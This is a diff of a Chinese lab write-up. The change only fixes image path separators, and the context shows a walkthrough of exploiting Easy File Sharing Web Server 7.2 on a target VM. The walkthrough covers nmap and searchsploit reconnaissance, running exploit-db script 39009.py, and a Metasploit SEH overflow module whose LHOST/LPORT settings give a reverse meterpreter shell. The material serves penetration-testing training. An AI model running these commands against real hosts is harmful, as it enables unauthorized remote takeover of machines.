@@ -12,11 +12,11 @@
 
 靶机 Easy File Sharing Web Server 启动界面如下：
 
-![](images\01-start.png)
+![](images/01-start.png)
 
 可以通过 IP 地址远程访问
 
-![](images\02-remote.png)
+![](images/02-remote.png)
 
 ---
 
@@ -34,11 +34,11 @@ nmap -sV 192.168.169.131
 80/tcp open http Easy File Sharing HTTP Server 7.2
 ```
 
-![](images\03-nmap.png)
+![](images/03-nmap.png)
 
 > 说明：nmap 是靠收集服务返回的特征（HTTP 响应头、banner、特定字符串等）来匹配自带的指纹库（`nmap-service-probes`），而Easy File Sharing 从 6.9 到 7.2 的网络响应特征几乎没变，指纹库里这条特征标注的是 6.9，于是就匹配成了 6.9，真实版本号以软件 About 界面为准
 
-![](images\04-version.png)
+![](images/04-version.png)
 
 ---
 
@@ -50,7 +50,7 @@ Kali 自带 exploit-db 漏洞库，使用 `searchsploit` 按软件名查找可�
 searchsploit Easy File Sharing
 ```
 
-![](images\05-searchsploit.png)
+![](images/05-searchsploit.png)
 
 输出结果中包含针对该软件的多个 exploit，例如 HTTP 服务的 SEH 溢出、FTP 服务的 PASS 溢出等：
 
@@ -63,7 +63,7 @@ Easy File Sharing Web Server 7.2 - GET 'PassWD' Remote Buffer Overflow (SEH)
 
 > 在线漏洞库地址：https://www.exploit-db.com
 
-![](images\11-exploit_db.png)
+![](images/11-exploit_db.png)
 
 可以在线查看漏洞的 EDB 编号和脚本内容。
 
@@ -136,9 +136,9 @@ python2 /usr/share/exploitdb/exploits/windows/remote/39009.py 192.168.10.131 80
 
 > 注意：部分老脚本基于 Python 2 编写，需用 `python2` 执行；若系统无 python2，可用 `python3` 版本的同类 exploit 或做语法适配。
 
-![](images\06-python-done.png)
+![](images/06-python-done.png)
 
-![](images\15-calc.png)
+![](images/15-calc.png)
 
 在靶机上弹出计算器，说明攻击成功。
 
@@ -155,9 +155,9 @@ msfconsole
 search EasyFileSharing
 ```
 
-![](images\07-msf_start.png)
+![](images/07-msf_start.png)
 
-![](images\08-msf_search.png)
+![](images/08-msf_search.png)
 
 ### 4.2 加载模块
 
@@ -171,7 +171,7 @@ use exploit/windows/http/easyfilesharing_seh
 show options
 ```
 
-![](images\12-show_options.png)
+![](images/12-show_options.png)
 
 ### 4.4 设置攻击载荷
 
@@ -188,7 +188,7 @@ set LHOST 192.168.10.129    # 攻击机 IP（回连地址）
 set LPORT 4444               # 回连端口
 ```
 
-![](images\09-msf_set.png)
+![](images/09-msf_set.png)
 
 ### 4.6 确认参数后执行
 
@@ -207,7 +207,7 @@ exploit
 meterpreter >
 ```
 
-![](images\10-msf_success.png)
+![](images/10-msf_success.png)
 
 ### 4.7 验证控制权限
 
@@ -220,7 +220,7 @@ getuid
 
 可查看目标系统信息和当前权限，确认已实现远程控制。
 
-![](images\14-uid.png)
+![](images/14-uid.png)
 
 ---
 
